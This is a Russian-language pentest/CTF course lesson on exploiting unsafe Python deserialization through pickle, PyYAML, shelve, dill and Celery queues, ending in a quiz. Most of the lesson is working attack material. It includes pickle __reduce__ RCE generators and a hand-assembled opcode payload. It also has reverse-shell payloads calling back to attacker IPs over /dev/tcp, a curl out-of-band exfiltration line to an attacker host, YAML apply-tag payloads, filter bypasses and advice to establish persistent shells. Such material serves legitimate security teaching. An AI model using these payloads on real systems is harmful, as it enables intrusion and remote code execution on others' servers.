---
id: web-python-deser
title: "Python deserialization: pickle, PyYAML, shelve"
category: web
parent: web-deser-languages
difficulty: hard
order: 1
tags: [python, pickle, deserialization, pyyaml, rce]
prerequisites: [web-deserialization]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 36
summary: "Небезопасная десериализация в Python: pickle RCE через __reduce__, PyYAML unsafe_load, shelve и обходы."
---

`pickle` — это **не формат данных, а виртуальная машина**: десериализация pickle выполняет произвольный код по определению, это заложено в спецификации, а не является багом конкретной библиотеки. Если приложение принимает pickle от пользователя (cookie, кеш, RPC, очередь задач), это RCE. Ровно то же касается `PyYAML` с `yaml.load` (без `SafeLoader`), `shelve`, `marshal` и сторонних `dill`/`joblib`. Этот урок — про генерацию payload, чтение байткода руками и реальные точки входа.

## Теория: почему pickle = RCE

Pickle-поток — это последовательность опкодов виртуальной машины `pickle` (`GLOBAL`, `REDUCE`, `BUILD`, `STACK_GLOBAL` и т.д.). Опкод `GLOBAL` кладёт на стек ссылку на любой импортируемый объект (`os.system`, `subprocess.check_output`), а `REDUCE` вызывает его с аргументами со стека. Поэтому минимальный эксплойт — это класс с методом `__reduce__`, который возвращает пару `(callable, args)`:

```python
import pickle, os
class RCE:
    def __reduce__(self):
        return (os.system, ('id',))
payload = pickle.dumps(RCE())
```

При `pickle.loads(payload)` интерпретатор вызовет `os.system('id')`. Никакого «sandbox» нет — безопасной десериализации недоверенного pickle не существует. Сравните с `json.loads`: JSON описывает только данные (числа, строки, списки, словари) и не может вызвать код.

## Байткод pickle: как читать payload вручную

Понимание опкодов нужно, когда нужно обойти фильтр по строке `os`/`system` или собрать payload без Python-класса. Разобрать поток:

```bash
python3 -c "import pickle,base64,sys; print(base64.b64encode(pickle.dumps({'a':1})).decode())"
python3 -m pickletools payload.bin          # дизассемблер опкодов
```

Ручной минимальный payload для `os.system('id')` (protocol 0, читаемый):

```text
cos
system
(S'id'
tR.
```

Опкоды: `c` (GLOBAL) — модуль `os`, объект `system`; `(` — MARK; `S'id'` — строка; `t` — TUPLE; `R` — REDUCE (вызов). Этот поток можно вставить в параметр как есть, если приложение принимает pickle в виде «сырых» байт или latin-1-строки.

## Генерация payload: базовые варианты

| Цель | Payload-функция | Пример |
|------|-----------------|--------|
| Команда, stdout не нужен | `os.system` | `(os.system, ('id',))` |
| Получить stdout | `subprocess.check_output` | `(subprocess.check_output, (['id'],))` |
| Reverse shell | `os.system` с bash | `(os.system, ('bash -c "bash -i >& /dev/tcp/IP/4444 0>&1"',))` |
| Без импорта os | `builtins.exec` | `(exec, ("import os;os.system('id')",))` |
| Слепой канал (OOB) | `os.system` с curl | `(os.system, ('curl http://ATTACKER/$(id|base64)',))` |

Универсальная заготовка генератора:

```python
import pickle, base64, sys
class RCE:
    def __reduce__(self):
        return (__import__('subprocess').check_output, (['bash','-c',sys.argv[1]],))
print(base64.b64encode(pickle.dumps(RCE(), protocol=2)).decode())
```

`protocol=2` даёт совместимость со старыми Python и часто проходит фильтры, которые ищут характерные для protocol 4-5 последовательности.

## Обходы ограничений

- **Whitelist классов через `find_class`.** Некоторые приложения переопределяют `Unpickler.find_class` и разрешают только «безопасные» классы. Обходы: использование разрешённого класса, у которого есть опасный `__setstate__`/`__reduce__`, либо цепочка через `copyreg._reconstructor`/`__builtin__`.
- **Фильтр по подстроке `os`.** Собирайте строку динамически: `__import__('o'+'s')`, `getattr(__import__('os'), 'sys'+'tem')`, или используйте `subprocess`/`posix`/`nt` вместо `os.system`.
- **Фильтр по `!!python/object/apply` в YAML.** Используйте `!!python/object/new`, `!!python/name`, `!!python/module` — они тоже исполняются `Loader`.
- **Base64/hex/url-кодирование.** Payload почти всегда заворачивают в base64 (cookies) или hex (заголовки).
- **`pickletools.optimize`** убирает лишние MEMO-опкоды и уменьшает размер.

## Разобранный пример: pickle в cookie

Цель отдаёт `Cookie: session=<base64(pickle)>` и на сервере делает `pickle.loads(base64.b64decode(cookie))`.

Шаг 1 — генератор с reverse shell:

```python
# gen.py
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"',))
print(base64.b64encode(pickle.dumps(RCE())).decode())
```

Шаг 2 — слушаем и отправляем:

```bash
nc -lvnp 4444
curl -s "https://app.example/" -H "Cookie: session=$(python3 gen.py)"
```

Шаг 3 — на сервере выполняется `os.system` → обратный shell на наш `nc`. Для слепого канала без egress используйте OOB-канал (DNS/HTTP к своему listener) или запись файла.

## PyYAML: yaml.load vs safe_load

```python
yaml.load(user_input)                        # ОПАСНО (до PyYAML 6.0 load = unsafe)
yaml.load(user_input, Loader=yaml.Loader)    # ОПАСНО
yaml.load(user_input, Loader=yaml.UnsafeLoader)  # ОПАСНО (явно)
yaml.full_load(user_input)                   # ОПАСНО (полный резолвер)
yaml.safe_load(user_input)                   # безопасно (только базовые типы)
```

Ключевой факт: **до PyYAML 5.1 `yaml.load` был unsafe по умолчанию**, а `safe_load` появился как отдельная функция. С 6.0 `yaml.load` требует явного `Loader`, но если код передаёт `Loader=yaml.Loader` — он по-прежнему уязвим. `ruamel.yaml` с `typ='unsafe'` — та же проблема.

## Разобранный пример: RCE через YAML-тег

Payload для `yaml.load`:

```yaml
!!python/object/apply:os.system ["id"]
```

или с выводом:

```yaml
!!python/object/apply:subprocess.check_output [["id"]]
```

Доставка:

```bash
curl -s -X POST https://app.example/api \
  -H 'Content-Type: application/x-yaml' \
  --data-binary 'yaml=!!python/object/apply:os.system ["bash -c \"id > /tmp/pwned\""]'
```

Если приложение парсит YAML из тела целиком, отправляйте сам тег без обёртки `yaml=`. Часто YAML приходит в загрузке конфигов, CI-манифестах, Helm values, Kubernetes-объектах.

## shelve, marshal, dill и другие

- **`shelve`** использует `pickle` под капотом → те же риски при записи в БД.
- **`marshal`** — не для недоверенных данных: не RCE напрямую, но может уронить интерпретатор (DoS).
- **`dill`** — расширение pickle, сериализует лямбды и функции → те же RCE-примитивы, часто забывают про него.
- **`joblib`** — на базе pickle; `joblib.load` недоверенного файла = RCE.
- **`Pyro4`/`XML-RPC`** с pickle-сериализацией, **`Celery`/`RQ`/`Kombu`** — очереди.

## Разобранный пример: очередь Celery/RQ → RCE

Celery по умолчанию сериализует задачи pickle'ом (`task_serializer='pickle'`). Если можно писать в брокер (Redis без auth, AMQP с дефолтными кредами), кладём туда malicious pickle, и воркер десериализует его:

```bash
# Redis без пароля, слушаем RPUSH в очередь celery
redis-cli -h TARGET RPUSH celery '{"content-type":"application/x-python-serialize","body":"<base64 pickle>"}'
```

Связка с SSRF → Redis (gopher) описана в `web-ssrf-protocol-smuggling`. Это классический путь «SSRF → очередь → RCE» в облачных стеках.

## Как искать точки десериализации

- Cookies/сессии с base64-блобами, начинающимися с `gASV`/`gAJ`/`8004` (base64 от pickle).
- Поля вида `data=`, `pickle=`, `state=`, `cache=`, `token=` в API.
- Redis/Memcached-кеш, в который кладутся сериализованные объекты.
- Очереди (Celery/RQ/Kombu), RPC (Pyro), XML-RPC.
- Файлы `.pkl`, `.pickle`, `.joblib`, `.npy` (numpy `allow_pickle=True`).
- Django-сессии с `pickle`-бэкендом, DRF-кэш.

Признаки в ответе/ошибке: `UnpicklingError`, `invalid load key`, `__reduce__`, `pickle`.

## Инструменты

- **`pickle`/`pickletools`** — генерация и дизассемблирование payload.
- **`python3`** — локальная проверка, что payload собирается и исполняется.
- **Burp Repeater/Intruder** — доставка и перебор кодировок.
- **`ysoserial`** — для Java (смежная тема, см. `web-java-deser-chains`); для Python — свои скрипты.
- **`pyyaml`** — проверка версии и загрузчика.

## Что дальше / decision

1. Нашли base64-блоб в cookie/параметре → декодируйте, посмотрите, начинается ли с pickle-магии (`\x80\x04`). Если да — сразу генератор с `os.system`.
2. Параметр уходит в `yaml.load` → попробуйте `!!python/object/apply:os.system ["id"]`.
3. Есть очередь/кеш без auth → пишите pickle через клиент или SSRF-gopher.
4. RCE подтверждён → ставьте **устойчивый** канал: reverse shell/tunnel, а не одноразовый `id`. Читайте вывод обратно (доказательство), не полагайтесь на fire-and-forget.
5. Если pickle подписан/зашифрован — ищите ключ (см. `web-ruby-deser` про `secret_key_base`), иначе вектор закрыт.

## Частые ошибки

- **Считать pickle «форматом данных».** Это исполняемая VM; JSON — нет.
- **Использовать `yaml.load` вместо `safe_load`.** RCE, особенно до PyYAML 6.0.
- **Забыть про кодировку.** Payload должен пройти base64/hex/url — иначе сервер не распарсит.
- **Ждать stdout в ответе.** Часто канал слепой — переходите на OOB/reverse shell.
- **Игнорировать очереди и кеш.** Там pickle повсюду и часто без аутентификации.
- **Проверять `os` строковым фильтром и сдаваться.** Строку можно собрать динамически.
- **Путать `marshal` и `pickle`.** `marshal` не даёт RCE напрямую.
- **Ломать прод.** RCE — только с явного согласия; проверяйте на тестовом стенде.

## Квиз

```quiz
- question: "Почему pickle опасен?"
  options:
    - "Он медленный"
    - "Десериализация исполняет произвольный код через __reduce__"
    - "Он шифрует"
    - "Он без типов"
  answer: 1
  explanation: "Pickle — исполняемая VM."
- question: "Какой метод определяет вызов при unpickle?"
  options:
    - "__init__"
    - "__reduce__"
    - "__str__"
    - "__dict__"
  answer: 1
  explanation: "__reduce__ задаёт функцию и аргументы."
- question: "Какая функция PyYAML безопасна?"
  options:
    - "yaml.load"
    - "yaml.safe_load"
    - "yaml.full_load"
    - "yaml.unsafe_load"
  answer: 1
  explanation: "safe_load запрещает python-теги."
- question: "Какой YAML-тег выполняет команду?"
  options:
    - "!!str"
    - "!!python/object/apply:os.system"
    - "!!int"
    - "!!map"
  answer: 1
  explanation: "python/object/apply вызывает функцию."
- question: "Где часто встречается pickle помимо cookies?"
  options:
    - "В HTML"
    - "В очередях (Celery/RQ) и кеше"
    - "В TLS"
    - "В DNS"
  answer: 1
  explanation: "Очереди сериализуют задачи pickle."
```

## Где пригодится

- **CTF (Web):** задачи на Python-deser.
- **Bug bounty:** RCE в Flask/Django-сервисах с pickle.
- **Пентест:** аудит Python-приложений и очередей.
- **Работа (AppSec):** JSON вместо pickle, `safe_load`, подпись/шифрование сериализованных данных.
